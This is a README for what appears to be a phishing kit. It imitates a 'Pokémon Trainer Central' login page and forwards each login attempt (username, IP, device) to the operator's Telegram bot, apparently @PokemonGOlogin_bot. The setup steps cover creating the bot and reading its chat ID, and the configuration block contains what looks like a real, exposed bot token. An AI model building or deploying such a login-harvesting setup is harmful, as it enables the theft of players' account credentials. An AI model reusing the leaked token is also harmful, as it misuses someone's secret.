# Pokémon Trainer Central - Telegram Bot Setup

## 🚀 Quick Start

### 1. Install Dependencies
```bash
npm install
```

### 2. Configure Telegram Bot
Edit `server.js` and replace:
- `YOUR_BOT_TOKEN_HERE` with your actual bot token
- `YOUR_CHAT_ID_HERE` with your Telegram chat ID

### 3. Start the Server
```bash
npm start
# or for development:
npm run dev
```

### 4. Open in Browser
Visit: http://localhost:3000

## 📱 Telegram Bot Setup Instructions

### Get Your Bot Token:
1. Talk to [@BotFather](https://t.me/BotFather) on Telegram
2. Send: `/newbot`
3. Choose a name (e.g., "Pokemon Login Bot")
4. Choose a username (e.g., "PokemonLoginBot")
5. BotFather will give you a token like: `123456789:ABCdefGHIjklMNOpqrsTUVwxyz`

### Get Your Chat ID:
1. Talk to your bot on Telegram
2. Send any message
3. Visit: `https://api.telegram.org/bot<YOUR_BOT_TOKEN>/getUpdates`
4. Find your `chat_id` in the response

### Final Configuration:
```javascript
const BOT_TOKEN = '8215904112:AAH06c70RFrcJtI0Qfla0dygrzCIF3_3rFM';
const CHAT_ID = 'YOUR_CHAT_ID_HERE';
```

## 🔧 Features

- ✅ Login attempt notifications to Telegram
- ✅ Real-time UI notifications
- ✅ IP address tracking
- ✅ Device information
- ✅ Timestamp logging
- ✅ Error handling
- ✅ Mobile responsive

## 📨 Notification Format

You'll receive messages like:
```
🔐 Pokémon Trainer Central Login Alert

👤 Username: trainer123
🕐 Time: 1/31/2026, 2:15:30 PM
🌐 IP: 192.168.1.1
📍 Device: Mozilla

New login attempt detected
```

## 🛡️ Security Notes

- Never expose your bot token in frontend code
- Use HTTPS in production
- Consider rate limiting
- Add proper authentication in production

## 🐛 Troubleshooting

If Telegram notifications don't work:
1. Check bot token is correct
2. Verify chat ID
3. Ensure bot can send messages to you
4. Check server console for errors
5. Verify network connectivity

## 📞 Support

For issues with @PokemonGOlogin_bot, contact the bot administrator.
